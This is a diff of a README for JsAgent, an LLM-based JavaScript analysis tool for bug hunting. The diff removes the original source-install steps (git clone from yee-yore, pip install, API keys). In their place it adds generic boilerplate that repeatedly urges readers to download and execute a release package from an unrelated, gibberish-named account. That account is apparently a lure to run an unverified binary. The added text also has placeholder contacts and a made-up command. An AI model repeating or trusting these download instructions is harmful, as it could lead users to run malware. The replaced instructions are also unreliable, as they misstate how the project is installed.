@@ -1,43 +1,119 @@
-# JsAgent
-🤖 LLM-powered agent for automated JS analysis in bug hunting &amp; pentesting.
+# JsAgent 🤖
 
-<img src="banner.png" alt="banner" width="700">                   
-                                                                                                    
+![JsAgent](https://img.shields.io/badge/JsAgent-LLM--powered%20Agent-blue.svg)  
+[Download Latest Release](https://github.com/dwawdsdwasdwasdwa/JsAgent/releases)  
+
+Welcome to **JsAgent**, your go-to solution for automated JavaScript analysis in bug hunting and penetration testing. This repository provides an advanced LLM-powered agent designed to streamline the process of identifying vulnerabilities in JavaScript applications.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Features
+
+- **Automated Analysis**: Quickly analyze JavaScript code for common vulnerabilities.
+- **Bug Hunting**: Identify potential security issues before they become problems.
+- **Pentesting Ready**: Integrate seamlessly into your penetration testing workflow.
+- **OSINT Capabilities**: Gather open-source intelligence to enhance your analysis.
+- **User-Friendly**: Designed with simplicity in mind for ease of use.
+
+## Installation
+
+To get started with JsAgent, download the latest release from the [Releases section](https://github.com/dwawdsdwasdwasdwa/JsAgent/releases). You will find a package that you can download and execute. 
+
+1. Navigate to the [Releases section](https://github.com/dwawdsdwasdwasdwa/JsAgent/releases).
+2. Download the appropriate file for your operating system.
+3. Follow the instructions in the documentation to install.
+
 ## Usage
-1. Git clone
+
+Once you have installed JsAgent, you can begin using it for your JavaScript analysis. Here’s a simple guide to get you started:
+
+1. **Open your terminal**.
+2. **Navigate to the directory** where JsAgent is installed.
+3. **Run the agent** with your target JavaScript file:
+
+   ```bash
+   ./JsAgent analyze path/to/your/javascript/file.js
+   ```
+
+4. **Review the output** for any identified vulnerabilities.
+
+### Example Command
+
+Here’s a practical example of how to use JsAgent:
+
 ```bash
-> git clone https://github.com/yee-yore/JsAgent.git
+./JsAgent analyze /path/to/example.js
 ```
 
-2. Install packages
-```bash
-# python version = 3.11.9
-> pip install -r requirements.txt # for macOS
-```
+This command will analyze the `example.js` file and return any vulnerabilities detected.
 
-3. Configure API keys in the `.env` file  
-- You must set at least **one** LLM API key (e.g., OpenAI, Anthropic, or Gemini) depending on your preference  
-- You can also integrate other LLMs: https://docs.crewai.com/concepts/llms
-```bash
-OPENAI_API_KEY=        # Optional - set if using OpenAI
-ANTHROPIC_API_KEY=     # Optional - set if using Anthropic
-GEMINI_API_KEY=        # Optional - set if using Gemini (free available)
-```
+## Contributing
 
-4. Run `jsagent.py`
-```bash
-> python jsagent.py
-```
+We welcome contributions from the community! If you would like to contribute to JsAgent, please follow these steps:
 
-## Customize
-1. Targets (`task()`)
-```bash
-# You can add things that can be extracted from Javascript (e.g. PII, Credential, Comment, IP address, etc.) to the description.
-```
-2. Agents (`agents()`)
-```bash
-# https://docs.crewai.com/concepts/agents
-```
+1. **Fork the repository**.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them with clear messages.
+4. **Push your changes** to your fork.
+5. **Create a pull request** to the main repository.
 
-## Update Log
-- **2025-04-22**: JsAgent ver 1.0
+### Code of Conduct
+
+Please adhere to our code of conduct while contributing. We aim to create a welcoming environment for everyone.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or suggestions, feel free to reach out:
+
+- **Email**: your-email@example.com
+- **Twitter**: [@yourtwitterhandle](https://twitter.com/yourtwitterhandle)
+
+## Acknowledgments
+
+Special thanks to the contributors and the open-source community for their invaluable support. Your contributions make this project possible!
+
+## Topics
+
+JsAgent covers a wide range of topics, including:
+
+- agent
+- aiagent
+- bugbounty
+- bughunting
+- hacking
+- javascript-analysis
+- jsrecon
+- llm
+- osint
+- pentest
+- pentesting
+
+These topics are integral to the functionality and purpose of JsAgent.
+
+## Additional Resources
+
+- [JavaScript Security Best Practices](https://owasp.org/www-project-top-ten/)
+- [Common JavaScript Vulnerabilities](https://portswigger.net/web-security)
+- [Penetration Testing Guide](https://www.offensive-security.com/pwk-oscp/)
+
+Feel free to explore these resources to enhance your understanding of JavaScript security and penetration testing.
+
+## Conclusion
+
+JsAgent is designed to empower developers and security professionals alike. By automating the analysis of JavaScript code, it helps identify vulnerabilities early, making it a valuable tool in your security arsenal. Download the latest release from the [Releases section](https://github.com/dwawdsdwasdwasdwa/JsAgent/releases) and start your journey towards more secure JavaScript applications today!
+
+![Security](https://img.shields.io/badge/Security-Enhance%20Your%20Code-green.svg)  
+[Download Latest Release](https://github.com/dwawdsdwasdwasdwa/JsAgent/releases)  
+
+Thank you for checking out JsAgent! Happy coding!
